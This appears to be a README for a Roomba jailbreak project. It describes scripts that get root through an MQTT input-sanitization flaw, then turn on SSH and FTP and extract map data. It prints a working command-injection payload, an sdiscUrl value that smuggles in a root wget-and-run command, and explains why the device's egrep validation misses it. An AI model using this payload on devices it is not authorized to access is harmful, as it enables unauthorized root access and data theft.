# roomba::unjailed

These are the scripts for the roomba::unjailed project, a jailbreak for most `lewis` Roomba models (i,j series), with more support to come.

> Using this jailbreak will not make your Roomba less secure, unless you expose ports `1883` (internal MQTT broker) or `22` (runjailed SSH server). These allow unrestricted access to the `cleantrack` daemon, with no root password.

## Supported Versions

- 22.52.08+
- Everything else is untested!!

## Introduction

`runjailed.py` is the Python host script, as Roomba has Python 2.7 pre-installed.

`jailbreak.py` jailbreaks a Roomba, and downloads `runjailed.py` to it.

The exploit takes advantage of a MQTT input sanitization vulnerability, gaining ACE as the `apps` user.

Luckily for us, the Roomba is based on BusyBox, so it has `busybox.suid`, and it's one of the few commands `apps` is allowed to run.

We use the ACE vulnerability to gain root access and download the `runjailed` script, which performs the rest of the jailbreak with the included scripts.

## Features

| Feature | Status |
|---------|--------|
| Root ACE | ✅ |
| SSH, FTP | ✅ |
| Exfiltrate PMap data | ✅ |
| Expose new internal MQTT messages to the public | 🛠️ |
| Expose Timeline Report to the public | 🛠️ |
| Communication with mobility/auxiliary boards | 🛠️ |
| Downgrading | ⚠️ |

🛠️: WIP  
⚠️: WIP, risky  

## One-click SSH

`oneclick-ssh.sh` enables SSH on the robot in a single run: it serves `scripts/`
over HTTP, publishes the `sdiscUrl` payload over the robot's local MQTT broker
(port 8883, TLS), collects the beacons, and waits until TCP/22 answers.

```sh
# credentials either interactive, via env, or via flags
read -rs ROOMBA_PASSWORD && export ROOMBA_PASSWORD   # robot password (not the iRobot account one)
export ROOMBA_BLID=<blid>

./runjailed/oneclick-ssh.sh 192.168.178.50
```

Options: `--blid`, `--password`, `--host-ip`, `--http-port` (8899),
`--beacon-port` (8883), `--ssh-port` (22), `--timeout` (120), `--dry-run`
(prints the payload only). `PYTHON=/path/to/venv/bin/python` selects the
interpreter if the default one lacks `paho-mqtt`
(`pip install -r runjailed/requirements.txt`).

Exit codes: `0` SSH reachable, `3` payload ran as root but the port is still
closed (the firewall picks up `SYSTEM_ACCESS="unlocked"` on the next start of
the connectivity services — reboot the robot and retry), `1` failure, `2` usage.

The payload the robot receives is one `sdiscUrl` string, at most 191 bytes:

```
https://$(/bin/busybox su -c 'wget -qO/tmp/e http://HOST:8899/enableSSH.sh;sh /tmp/e HOST 8899 8883')
```

`connectivity_manager` interpolates that value into
`echo "%s" | egrep -e '^https+[^;[:space:]]+$'` and runs it through `popen()`;
the double quotes do not stop `$(...)`, so the command runs before the URL is
validated. Same process, same 191-byte limit for every manual send:
`runjailed.py --send '<url>'` or `--enable-ssh HOST[:PORT]`.

## Scripts

> `runjailed` and these scripts assume you already have obtained root access. Note that you can perform most of the scripts anyways using the BusyBox SUID script, but it's better to have root anyway.

- `oneclick-ssh.sh`: Host script — serves the scripts, sends the MQTT payload, waits for SSH (see above).
- `enableSSH.sh`: Runs on the robot as root: fetches `sshd.socket`, unlocks `SYSTEM_ACCESS`, enables the socket unit.
- `jailbreak.sh`: The initial script, only ran once by `jailbreak.py`, runs `sshd.sh` to begin an SSH server for a more stable connection.
- `enableDevMode.sh`: Sets the provisioning configuration key `DEV_MODE` to `enabled` from `disabled`.
- `ftp.sh`: Uses `tcpsvd` to host a simple FTPd server with write access from the `/` root on port 21.
- `sshd.sh`: Opens a SSH server on port 21.
- `unlock.sh`:  Sets the provisioning configuration key `SYSTEM_ACCESS` to `unlocked` from `locked`. This brings down the strict firewall rules.